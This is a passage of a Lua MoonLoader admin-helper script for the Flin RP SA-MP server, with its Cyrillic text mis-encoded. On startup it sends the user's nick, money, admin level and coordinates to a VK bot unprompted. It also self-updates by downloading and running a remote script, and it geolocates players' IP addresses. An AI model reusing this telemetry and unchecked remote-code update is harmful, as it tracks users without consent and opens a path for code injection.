	if ip == '193.84.90.17:7772' then
	response = response .. '������: 02 Flin RP\n'
	else
	if ip ~= '193.84.90.17' then
		response = response .. '������: ' .. sampGetCurrentServerName() .. '\n'
	end
	end
	end--]]
	--[[if ip ~= '193.84.90.17' then
		response = response .. '������ �� ��������� � ������ ������� Flin Mobile\n'
		else
		response = response .. '������ ������� Flin Mobile\n'
	end--]]
	response = response .. '������: \n' .. sampGetCurrentServerName() .. '\n\n'
	end
	if statusOnline.v then
		response = response .. '���-�� �������: ' .. sampGetPlayerCount(false) .. '\n\n'
	end
	if statusHp.v then
		response = response .. '�������� ������: ' .. getCharHealth(PLAYER_PED) .. '\n\n'
	end
	response = response .. '- \n'
	if statusArmor.v then
		response = response .. 'VERS: FReport Helper V2.3 \n\n'
	end
	if statusArmor.v then
		response = response .. '������� ADM: '.. cfg.settings.lvladmin .. '\n'
	end
	response = response .. '- \n\n'
	if statusMoney.v then
		response = response .. '������ ������: ' .. getPlayerMoney(PLAYER_HANDLE) .. '\n\n'
	end
	if statusPos.v then
		local x, y, z = getCharCoordinates(PLAYER_PED)
		response = response .. '������� ������: \nx: ' .. string.format('%.3f', x) .. ' \ny: ' .. string.format('%.3f', y) .. ' \nz: ' .. string.format('%.3f', z)
	end
	vk_request(response)
--	sampSendChat('/stats '.. id .. '')
	--stats = true
end
end
function main()
  if not isSampLoaded() or not isSampfuncsLoaded() then return end
	while not isSampAvailable() do wait(100) end
		local response = ''
response = response .. ' \n������������ ' .. getMyName():gsub('%[PC%]', '').. ' ������������ � �������...  \n\n'
vk_request(response)
  imgui.Process = true
  
	main_window_state.v = false
	prices_window_state.v = false
	gps_window_state.v = false
	mn.v = false
	pokupka.v = false
	izmena.v = false
	izmenarmenu.v = false
	okno.v = false
		backokno.v = false
				nextokno.v = false
	statew.v = false
	statew2.v = false
	statew4.v = false
	statew5.v = false
	statew9.v = false
	unjail_menu.v = false
	afkld.v = false
	pstatew.v = false
	pstatew2.v = false
	pstatew4.v = false
	pstatew5.v = false
	pstatew9.v = false
	punjail_menu.v = false
	while not sampIsLocalPlayerSpawned() do wait(0) end
	
	 local result, target = getCharPlayerIsTargeting(playerHandle)
  result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	--   name = sampGetPlayerIdByCharHandle(PLAYER_PED)
	accId = getId()
	local response = ''
	response = response .. '� ���� ����� ������������:\n\n'
		
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	
	
	response = response .. '������: \n' .. sampGetCurrentServerName() .. '\n\n'
	
	
		response = response .. '���-�� �������: ' .. sampGetPlayerCount(false) .. '\n\n'
	
	
		response = response .. '�������� ������: ' .. getCharHealth(PLAYER_PED) .. '\n\n'
	
	
		response = response .. '- \n'
	
		response = response .. 'VERS: FReport Helper V2.3 \n\n'
	
	
		response = response .. '������� ADM: '.. cfg.settings.lvladmin .. '\n'

	response = response .. '- \n\n'
	
	
		response = response .. '������ ������: ' .. getPlayerMoney(PLAYER_HANDLE) .. '\n\n'
	
	
		local x, y, z = getCharCoordinates(PLAYER_PED)
		response = response .. '������� ������: \nx: ' .. string.format('%.3f', x) .. ' \ny: ' .. string.format('%.3f', y) .. ' \nz: ' .. string.format('%.3f', z)
	
		vk_request(response)
	
	lvlinf = 0
	if  isAccessScript(sampGetPlayerNickname(id))  then
		accessnahuy = true
		else
		accessnahuy = false
   end
   
	notify.addNotify("{ffdead}FReport Helper:\n", "{FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022", 2, 2, 6)
	notify.addNotify("{ffdead}FReport Helper:\n", "{ffdead}������ {32CD32}������� {ffdead}��������{ffffff}.", 2, 2, 6)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}������ ��������. |{f44f36}V2.3{FFFFFF}| | By {32CD32}N.Everyone {FFFFFF}|', 0xffdead)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����������� ������� {FFA500}/rmenu {FFFFFF}����� ������� ���� �������.', 0xffdead)
	wait(100)
	sampSendChat("/a [For Developers] [FReport Helper]: ������������� ��� ������������ FReport Helper V2.3 .")
--[[if cfg.settings.forever == true then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����������� ����, ����� ������������ {ffdead}FReport Helper {f44f36}2.2{FFFFFF}.', 0xffdead)
	  cfg.settings.forever = false
		
				inicfg.save(cfg, cfgConfig)
	end--]]
	--[[sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������: {4682B4}TEST {FFFFFF}.', 0xffdead)
	wait(1000)
	sampAddChatMessage('{ffdead}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~', 0xffdead)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}������ ������/������� ������� ��������� � ����-��������.', 0xffdead)
	if accessnahuy == false then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���: {008000}'..getNick(id):gsub('%[PC%]', '').. '{ffffff}. {FFFFFF}������ {FF0000}��������{FFFFFF}.', 0xffdead)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}������ ����� ��������, �� ������ ������� ������ ������������� �������.', 0xffdead)
	printStyledString('acess false', 1000, 1)
	wait(2500)
	sampAddChatMessage('{ffdead}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~', 0xffdead)
	sampAddChatMessage('{ffdead}[FReport Helper]:{FFFFFF} ������ ��� ��������. ��� ����������� ����������� {ffdead}CTRL{ffffff} + {ffdead}R{ffffff}.', 0xffdead)
			sampAddChatMessage('{ffdead}[FReport Helper]:{FFFFFF} ���� � ��� �� ������ ���������� �����, �� ������� ��� ���� �� {ffdead}TAB{ffffff}.', 0xffdead)
	 thisScript():unload()
	else
	if accessnahuy == true then 
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ���: {008000}' ..getNick(id):gsub('%[PC%]', '').. '{ffffff}. {FFFFFF}������ {00FF00}��������{FFFFFF}.', 0xffdead)
	printStyledString('acess true', 1000, 1)
	wait(2500)
	printStyledString('FREPORT HELPER TEST EDITION', 6000, 1)
	end
	end--]]
	if cfg.settings.nachalo == true then
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����������� ����, ����� ������������ {ffdead}FReport Helper {f44f36}2.3{FFFFFF}.', 0xffdead)
		 wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {ffdead}FReport Helper {FFFFFF}��� �� ���������� ����������� {32CD32}Admin Tools {FFFFFF}��� {FFA500}Flin RP{FFFFFF}.', 0xffdead)
		  wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� ���� ����� ����� �������, ����� {FFA500}/rmenu{FFFFFF}>{ffdead}���������� � ������� �������{FFFFFF}.', 0xffdead)
		  wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}������������ �� ����� ������������, {FFA500}/rmenu{FFFFFF}>{ffdead}���������� �� �����������{FFFFFF}.', 0xffdead)
		  wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � �� �����, ����� �� �������� � ��� ������ �� ��������.', 0xffdead)
		  wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� � ��� ����� {FFA500}/rmenu{FFFFFF}>{ffdead}���������� � S U P{FFFFFF}>{ffdead}������ �������{FFFFFF}.', 0xffdead)
		 wait(1000)
		 sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}� ����� ������ ��� ������������� 1 ������� ����������������� ����.', 0xffdead)
		  wait(1000)
		  sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������� ���� �� ������ �������� �������.', 0xffdead)
		  wait(1000)
		  
		 
	
		  cfg.settings.nachalo = false
		
				inicfg.save(cfg, cfgConfig)
	end
	local ip, port = sampGetCurrentServerAddress()
	if ip ~= '193.84.90.17' then
		sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}������ ������ �������� ������ �� �������� {FFA800}Flin RolePlay{ffffff}.', 0xFFFFFF)
		sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}��� ����������������� ������� ��� ����� ����� �� ������ ������.', 0xFFFFFF)
		thisScript():unload()
		--return false
	end
 
--193.84.90.17

  _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
  nick = sampGetPlayerNickname(id)
  	-- command
	sampRegisterChatCommand("getlvl", cmd_getlvl)
	sampRegisterChatCommand('tppost', cmdPostInfo)
	
	sampRegisterChatCommand('re', cmd_recon)
	sampRegisterChatCommand('reoff', cmd_reoff)
	sampRegisterChatCommand('pognaliblyat', pognaliblyat)
	
	sampRegisterChatCommand('repm', repm)
	sampRegisterChatCommand('znach', znach)
	
	sampRegisterChatCommand('rmenu', rmenu)
  thread = lua_thread.create_suspended(thread_function)

--[[sampRegisterChatCommand('menufastffffff', cmd_menufastffffff)
sampRegisterChatCommand('menurepffffff', cmd_menurepffffff)
--]]

 local status, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	if status then
	
  	if  isadelyaSript(sampGetPlayerNickname(id)) then
	lua_thread.create(function()
	wait(3000)
   sampAddChatMessage(tag ..'{ffffff}��������, ������. �� ��� �������� ������� �������� ����(', -1)
   end)
   end
  if  iskraimScript(sampGetPlayerNickname(id)) then
  lua_thread.create(function()
	wait(3000)
   sampAddChatMessage(tag ..'{ffffff}������ ������, ��� ������ ����))', -1)
   end)
   end
   if  isakinaScript(sampGetPlayerNickname(id)) then
   lua_thread.create(function()
	wait(3000)
   sampAddChatMessage(tag ..'{ffffff}������, ������) ����� ���� �������� ����))', -1)
   end)
   end

	downloadUrlToFile(update_url, update_path, function(id, status)
		if status == dlstatus.STATUSEX_ENDDOWNLOAD then
			updateIni = inicfg.load(nil, update_path)
				if tonumber(updateIni.info.vers) > script_vers then
				sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ���� ������� ���������� ������ -  {FFD700}" .. updateIni.info.vers_text, -1)
				sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ������� ���������� ����������... ", -1)
				update_state = true
				end
			os.remove(update_path)
		end
	end)

	
	--if not isAccessScript(sampGetPlayerNickname(id))  then
		--if cfg.settings.forever == true then
	--lua_thread.create(function()
	--wait(3000)
	--sampAddChatMessage('{ffdead}[FReport Helper]: {FF0000}��������! {ffffff}��� ������ ���������� �� ����������: {32CD32}Nik_Everyone{FFA500}[OWNER] {FFFFFF}.', 0xFFFFFF)
	-- sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}����� ����������: {FF7F50}��������� ����� ������� �� ������� @nikeveryone. {FFFFFF}.', 0xFFFFFF)
	-- sampAddChatMessage('{ffdead}[FReport Helper]: {00FF00}Thanks for using {ffffff}| {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 {ffffff}.', 0xFFFFFF)
	--sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}�� ���� �������� �� {808080}Black List {FFFFFF}�������� {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 ', 0xFFFFFF)
	--sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}�� ���� �������� �����������: {32CD32}Nik_Everyone{FFA500}[OWNER] {FFFFFF}.', 0xFFFFFF)
--	sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}������ {FF0000}�� ���������{FFFFFF}!', 0xFFFFFF)
	--sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}��� {00FF00}�������������� {ffffff}������ ������ ����� {FF7F50}������������.', 0xFFFFFF)
  --[[ sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}�� � {808080}Black List {FFFFFF}�������� {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 {ffffff}.', 0xFFFFFF)
    sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}������� ���������: {FF7F50}��� �������, ���. {FFFFFF}.', 0xFFFFFF)
	
   sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}��� ��� ������ � ������� {FF0000}������������{ffffff}.', 0xFFFFFF)

    thisScript():unload()--]]
	-- cfg.settings.forever = false
		
			--	inicfg.save(cfg, cfgConfig)
	--	wait(1000)	
--thisScript():reload()		

	--end)
--else
--if  isadelyaSript(sampGetPlayerNickname(id)) then
	
   
--sampAddChatMessage('{ffdead}[FReport Helper]: {FF0000}��������! {ffffff}��� ������ ���������� �� ����������: {32CD32}Nik_Everyone{FFA500}[OWNER] {FFFFFF}.', 0xFFFFFF)
--	 sampAddChatMessage('{ffdead}[FReport Helper]: {ffffff}����� ����������: {FF7F50}����� ����� �� ������� @nikeveryone. {FFFFFF}.', 0xFFFFFF)
---	 sampAddChatMessage('{ffdead}[FReport Helper]: {00FF00}Thanks for using {ffffff}| {FFA500}Samp Umbrella Project {ffdead}� {FFA500}2022 {ffffff}.', 0xFFFFFF)	
--	end
 --  end
	
--local status, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
  end
  longpollGetKey()
	while not key do wait(1) end
	loop_async_http_request(server .. '?act=a_check&key=' .. key .. '&ts=' .. ts .. '&wait=25', '')
	wait(0)
	while true do wait(0)
	
	if update_state then
	downloadUrlToFile(script_url, script_path, function(id, status)
	if status == dlstatus.STATUSEX_ENDDOWNLOAD then
		sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} C����� ��� ������� �� ������ -  {FFD700}" .. updateIni.info.vers_text, -1)
		thisScript():reload()
		else
		--sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} ������ � ����������, ���������� �� ���� �����������.", -1)
		end
	end)
	break
	end
	

		if bools.antifallstatus.v then
			if isCharPlayingAnim(PLAYER_PED, "KO_SKID_BACK") or isCharPlayingAnim(PLAYER_PED, "FALL_COLLAPSE") then
				local fX, fY, fZ = getOffsetFromCharInWorldCoords(PLAYER_PED, 0.0, 0.0, -1.0)
				setCharCoordinates(PLAYER_PED, fX, fY, fZ)
			end
			DisableBikeFallInWater(true)
			setCharCanBeKnockedOffBike(playerPed, true)
		else
			DisableBikeFallInWater(false)
			setCharCanBeKnockedOffBike(playerPed, false)
		end

	
	if isKeyJustPressed(VK_NUMPAD5) then
	
			sampSendChat("/arep")
  	end

  

		if not main_window_state.v and not prices_window_state.v and not gps_window_state.v and not statew.v and not okno.v and not backokno.v and not nextokno.v and not unjail_menu.v and not afkld.v and not setskin.v and not statew2.v and not statew4.v and not statew5.v and not statew9.v then
			imgui.ShowCursor = false
		else
			imgui.ShowCursor = true
		end

		if main_window_state.v and isKeyDown(VK_RETURN) then
			arep_answer = true
		end

		if arep_answer then
			if text_buffer.v == '' then
				sampAddChatMessage(tag..'{FFFFFF} �� �� ����� ������ � ������!', -1)
				arep_answer = false
				wait(100)
			elseif text_buffer.v ~= '' then
				sampSendDialogResponse(id_dialog, 1, 0, u8:decode(text_buffer.v))
				wait(50)
				arep_answer = false
				text_buffer.v = ''
				sampCloseCurrentDialogWithButton(1)
				main_window_state.v = false
				prices_window_state.v = false
				gps_window_state.v = false
			end
		end
		
		if state == false then
		ookno.v = false
backokno.v = false
nextokno.v = false
statew.v = false
statew2.v = false
statew4.v = false
statew5.v = false
statew9.v = false
statew6.v = false
statew7.v = false
pstatew.v = false
pstatew2.v = false
pstatew4.v = false
pstatew5.v = false
pstatew9.v = false
pstatew6.v = false
pstatew7.v = false
end


	
		if  recon_menu and wasKeyPressed(VK_SPACE) and not sampIsChatInputActive() then
			okno.v = true
				backokno.v = true
				nextokno.v = true
		end
		if recon_menu and wasKeyPressed(VK_RBUTTON) and not sampIsChatInputActive() then
			statew.v = true
		end
		end
		if wasKeyPressed(VK_F1) then
lua_thread.create(function()
	sampSendChat('/flip')
		wait(1000)
	sampSendChat('/fixveh')
end)
	end
if wasKeyPressed(VK_F2) then
	sampSendChat('/arep')
	end
if wasKeyPressed(VK_F3) then
	sampSendChat('/reoff')
	end
	
		end

function getMyName()
	local ok, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	if ok then
		return sampGetPlayerNickname(id)
	else
		return 'Unknown'
	end
end

function getId()
	local ip, port = sampGetCurrentServerAddress()
	local nick = getMyName()
	for k, v in ipairs(accs) do
		if v.nick == nick and v.ip == ip and v.port == port then
			return k
		end
	end
	accs[#accs + 1] = {}
	accs[#accs].nick = nick
	accs[#accs].ip = ip
	accs[#accs].port = port
	inicfg.save(accs, 'vkaccs.ini')
	return #accs
end

--commands



--imgui shit






function saveJson()
	local text = encodeJson(filters)
	local f = io.open('moonloader/config/vkfilters.json', 'w')
	f:write(text)
	f:close()
end

if not doesFileExist('moonloader/config/vkfilters.json') then
	saveJson()
else
	local f = io.open('moonloader/config/vkfilters.json', 'r')
	local text = f:read('*a')
	filters = decodeJson(text)
	f:close()

end





--SAMPEV



--[[function sampev.onShowDialog(id, style, title, b1, b2, text)
if stats == true then 
	if ini.dialogs.enable then
		if style == 2 or style == 4 then
			text = text .. '\n'
			local new = ''
			local count = 1
			for line in text:gmatch('.-\n') do
				if line:find(tostring(count)) then
					new = new .. line
				else
					new = new .. '[' .. count .. '] ' .. line
				end
				count = count + 1
			end
			text = new
			sampCloseCurrentDialogWithButton(0)
		end
		if style == 5 then
			text = text .. '\n'
			local new = ''
			local count = 1
			for line in text:gmatch('.-\n') do
				if count > 1 then
					if line:find(tostring(count - 1)) then
						new = new .. line
					else
						new = new .. '[' .. count - 1 .. '] ' .. line
					end
				else
					new = new .. '[HEAD] ' .. line
				end
				count = count + 1
			end
			text = new
			sampCloseCurrentDialogWithButton(0)
		end
	--	vk_request('[D' .. id .. '] ' .. title .. '\n' .. text)
	--	sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, -1)
	--stats = false
	 
	end
	end
end--]]

function handlePos(pos)
	if otherPos.v then
		local x, y, z = getCharCoordinates(PLAYER_PED)
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '������ ������� ������� ������������ ��\nX:' .. string.format('%.3f', pos.x) .. ' \nY: ' .. string.format('%.3f', pos.y) .. ' \nZ: ' .. string.format('%.3f',  pos.z) .. '. \n����������: ' .. string.format('%.3f', getDistanceBetweenCoords3d(x, y, z, pos.x, pos.y, pos.z))
		vk_request(response)
		
	end
end

function sampev.onSetPlayerPos(pos)
	handlePos(pos)
end

function sampev.onSetPlayerPosFindZ(pos)
	handlePos(pos)
end

function sampev.onSendSpawn()
	if otherSpawn.v then
	result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	response = response .. '������������ ��� ���������.'
	vk_request(response)
		
	end
	-- body
end

function sampev.onSendClientJoin()
	accId = getId()
end

function onReceivePacket(id)
	if otherDc.v then
		if id == 33 then
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '� ������������ ���� �������� ���������� � ��������.'
		vk_request(response)
			
		elseif id == 32 then
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '� ������������ ������ ������ ����������.'
		vk_request(response)
			
		end
	end
end

--internal

function vkKeyboard() --������� ���������� ���������� ��� ���� VK, ��� ������� ��� ����� ����� ������� ���� �� �����������
	local keyboard = {}
	keyboard.one_time = false
	keyboard.buttons = {}
	keyboard.buttons[1] = {}
	local row = keyboard.buttons[1]
	row[1] = {}
	row[1].action = {}
	row[1].color = 'secondary'
	row[1].action.type = 'text'
	row[1].action.payload = '{"button": "help"}'
	row[1].action.label = 'Info'
	row[2] = {}
	row[2].action = {}
	row[2].color = 'primary'
	row[2].action.type = 'text'
	row[2].action.payload = '{"button": "status"}'
	row[2].action.label = '������'
	
	row[3] = {}
	row[3].action = {}
	row[3].color = 'positive'
	row[3].action.type = 'text'
	row[3].action.payload = '{"button": "testa"}'
	row[3].action.label = '���� /a'
	row[4] = {}
	row[4].action = {}
	row[4].color = 'negative'
	row[4].action.type = 'text'
	row[4].action.payload = '{"button": "reload"}'
	row[4].action.label = 'reload'
	return encodeJson(keyboard)
end


function char_to_hex(str)
  return string.format("%%%02X", string.byte(str))
end

function url_encode(str)
  local str = string.gsub(str, "\\", "\\")
  local str = string.gsub(str, "([^%w])", char_to_hex)
  return str
end







local lvlinf = -1 

function rmenu()
 admmenu.v = not admmenu.v 
if lvlinf == -1 then
sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} {FFD700}[�����������] {ffffff}������� �������������� ����� �������� �� ������� ������.", -1)
end
 lvlinf = lvlinf + 1
  if lvlinf == 3 then
  sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} {FFD700}[�����������] {ffffff}������� �������������� ����� �������� �� ������� ������.", -1)
 lvlinf = 0

 end
 end

function repm()
nick_report = 'Nik_Everyone'
text_report = "������/���������: Nik_Everyone"
id_report = '228'
main_window_state.v = not main_window_state.v
end

function znach(arg)
if #arg == 0 then
sampAddChatMessage("huy", -1)
else
	cfg.settings.pervayatext = arg
	inicfg.save(cfg, cfgConfig)
	end
end

function isadelyaSript(name)
  	local access = false
  	for i = 1, #adelyaName do
    if name:find(adelyaName[i]) then
	access = true
	break
  	end
end
	return access
end

function iskraimScript(name)
  	local access = false
  	for i = 1, #kraimName do
    if name:find(kraimName[i]) then
	access = true
	break
  	end
end
	return access
end

function isakinaScript(name)
  	local access = false
  	for i = 1, #akinaName do
    if name:find(akinaName[i]) then
	access = true
	break
  	end
end
	return access
end

function pognaliblyat()
lua_thread.create(function()
wait(3000)
sampAddChatMessage('Nik_Everyone [228]: ���', -1)
wait(800)
sampAddChatMessage('Nik_Everyone [228]: ���', -1)
wait(800)
sampAddChatMessage('Nik_Everyone [228]: ����', -1)
wait(800)
sampAddChatMessage('Nik_Everyone [228]: �������!', -1)
wait(500)
 sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	sampAddChatMessage("", -1)
	wait(200)
	sampAddChatMessage("{FFA500}Samp Umbrella Project {ffffff}� {FFA500}2022 {ffffff}| �������� ����������...", -1)
	wait(1000)
	sampAddChatMessage("{FFA500}Samp Umbrella Project {ffffff}� {FFA500}2022 {ffffff}| �������� �����������...", -1)
	wait(1000)
	sampAddChatMessage("{FFA500}Samp Umbrella Project {ffffff}� {FFA500}2022 {ffffff}| �������� ������� ������...", -1)
	wait(1100)
	sampAddChatMessage("{FFA500}Samp Umbrella Project {ffffff}� {FFA500}2022 {ffffff}| ������ {ffdead}FReport Helper {FFD700}2.3{ffffff}...", -1)
	wait(1100)
	sampAddChatMessage("wait...", -1)
	wait(1000)
	sampAddChatMessage("system normal", -1)
	wait(1000)
	sampAddChatMessage('launching...', -1)
	wait(500)
	sampAddChatMessage("", -1)
	wait(500)
	sampAddChatMessage("", -1)
	wait(500)
	sampAddChatMessage("", -1)
	wait(1000)
notify.addNotify("{ffdead}FReport Helper:\n", "{FFA500}Samp Umbrella Project {ffffff}� {FFA500}2022", 2, 2, 6)
	notify.addNotify("{ffdead}FReport Helper:\n", "{ffdead}������ {32CD32}������� {ffdead}��������{ffffff}.", 2, 2, 6)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}������ ��������. |{f44f36}V2.3{FFFFFF}| | By {32CD32}N.Everyone {FFFFFF}|', 0xffdead)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����������� ������� {FFA500}/rmenu {FFFFFF}����� ������� ���� �������.', 0xffdead)
	
	end)
end

function isAccessScript(name)
  	local access = false
  	for i = 1, #accessName do
    if name:find(accessName[i]) then
	access = true
	break
  	end
end
	return access
end

function ishelperScript(name)
  	local access = false
  	for i = 1, #helperName do
    if name:find(helperName[i]) then
	access = true
	break
  	end
end
	return access
end

function ismlmoderatorScript(name)
  	local access = false
  	for i = 1, #mlmoderatorName do
    if name:find(mlmoderatorName[i]) then
	access = true
	break
  	end
end
	return access
end
function ismoderatorScript(name)
  	local access = false
  	for i = 1, #moderatorName do
    if name:find(moderatorName[i]) then
	access = true
	break
  	end
end
	return access
end
function isstmoderatorScript(name)
  	local access = false
  	for i = 1, #stmoderatorName do
    if name:find(stmoderatorName[i]) then
	access = true
	break
  	end
end
	return access
end
function ismladminScript(name)
  	local access = false
  	for i = 1, #mladminName do
    if name:find(mladminName[i]) then
	access = true
	break
  	end
end
	return access
end
function isadminScript(name)
  	local access = false
  	for i = 1, #adminName do
    if name:find(adminName[i]) then
	access = true
	break
  	end
end
	return access
end
function israzrabScript(name)
  	local access = false
  	for i = 1, #razrabName do
    if name:find(razrabName[i]) then
	access = true
	break
  	end
end
	return access
end
function isvladelScript(name)
  	local access = false
  	for i = 1, #vladelName do
    if name:find(vladelName[i]) then
	access = true
	break
  	end
end
	return access
end
function split(str, delim, plain)
    local tokens, pos, plain = {}, 1, not (plain == false)
    repeat
        local npos, epos = string.find(str, delim, pos, plain)
        table.insert(tokens, string.sub(str, pos, npos and npos - 1))
        pos = epos and epos + 1
    until not pos
		tokenss = npos
    return tokens
end


function ipinfo(ip)
	lua_thread.create(function()
		if ip:find(',') then
			ip1, ip2 = ip:match('(.*),%s?(.*)')
			local result1, response1 = pcall(requests.get, "https://extreme-ip-lookup.com"..ip1)
			local result2, response2 = pcall(requests.get, "https://extreme-ip-lookup.com"..ip2)
			if result1 and result2 then
				jres1 = response1.json()
				jres2 = response2.json()
				if jres1.status == 'success' and jres2.status == 'success' then
					ipshka1 = jres1.query
					country1 = jres1.country
					region1 = jres1.region
					city1 = jres1.city
					provider1 = jres1.org
					ipshka2 = jres2.query
					country2 = jres2.country
					region2 = jres2.region
					city2 = jres2.city
					provider2 = jres2.org
					lat = jres1.lat
					lon = jres1.lon
					lat2 = jres2.lat
					lon2 = jres2.lon
					distanceL = calculateLatLon(lat, lon, lat2, lon2)
					sampAddChatMessage('{00ff00}[C]: {ffffff}���������� �� IP: '..calcColor(ipshka1, ipshka2, 2)..'[{ffffff}'..ipshka1..calcColor(ipshka1, ipshka2, 2)..' �{ffffff} '..ipshka2..calcColor(ipshka1, ipshka2, 2)..']', -1)
					if math.floor(distanceL) <= 4 then
						distColor = '{00ff00}'
					elseif math.floor(distanceL) >= 5 and math.floor(distanceL) <= 50 then
						distColor = '{ffcc66}'
					else
						distColor = '{ff6666}'
					end
					sampAddChatMessage('{00ff00}[C]: {ffffff}����������: '..distColor..'[{ffffff}'..math.floor(distanceL)..' ��.'..distColor..']', -1)
					sampAddChatMessage('{00ff00}[C]: {ffffff}������: '..calcColor(country1, country2, 1)..'[{ffffff}'..country1..calcColor(country1, country2, 1)..' �{ffffff} '..country2..calcColor(country1, country2, 1)..']', -1)
					sampAddChatMessage('{00ff00}[C]: {ffffff}������/�������: '..calcColor(region1, region2, 1)..'[{ffffff}'..region1..calcColor(region1, region2, 1)..' �{ffffff} '..region2..calcColor(region1, region2, 1)..']', -1)
					sampAddChatMessage('{00ff00}[C]: {ffffff}�����: '..calcColor(city1, city2, 1)..'[{ffffff}'..city1..calcColor(city1, city2, 1)..' �{ffffff} '..city2..calcColor(city1, city2, 1)..']')
					sampAddChatMessage('{00ff00}[C]: {ffffff}���������: '..calcColor(provider1, provider2, 1)..'[{ffffff}'..provider1..calcColor(provider1, provider2, 1)..' �{ffffff} '..provider2..calcColor(provider1, provider2, 1)..']', -1)
				else
					sampAddChatMessage('������. ���������� �� ���������� ip �� �������.', -1)
				end
			end
		end
	end)
end

function calcColor(var1, var2, typec)
	local color
	if typec == 1 then
		if var1 == var2 then
			color = '{00ff00}'
		else
			color = '{ff6666}'
		end
	elseif typec == 2 then
		local digits1 = split(var1, '.')
		local digits2 = split(var2, '.')
		if var1 == var2 then
			color = '{00ff00}'
		elseif digits1[1] == digits2[1] and digits1[2] == digits2[2] then
			color = '{ffcc66}'
		else
			color = '{ff6666}'
		end
	end
	return color
end

function calculateLatLon(lat1, lon1, lat2, lon2)
	if lat1 == nil or lon1 == nil or lat2 == nil or lon2 == nil or lat1 == "" or lon1 == "" or lat2 == "" or lon2 == "" then
		return 0
	end
	local dlat = math.rad(lat2 - lat1)
	local dlon = math.rad(lon2 - lon1)
	local sin_dlat = math.sin(dlat / 2)
	local sin_dlon = math.sin(dlon / 2)
	local a =
		sin_dlat * sin_dlat + math.cos(math.rad(lat1)) * math.cos(
			math.rad(lat2)
		) * sin_dlon * sin_dlon
	local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
	local d = 6378 * c
	return d
end

function imgui.CenterTextColoredRGB(text)
    local width = imgui.GetWindowWidth()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4

    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end

    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
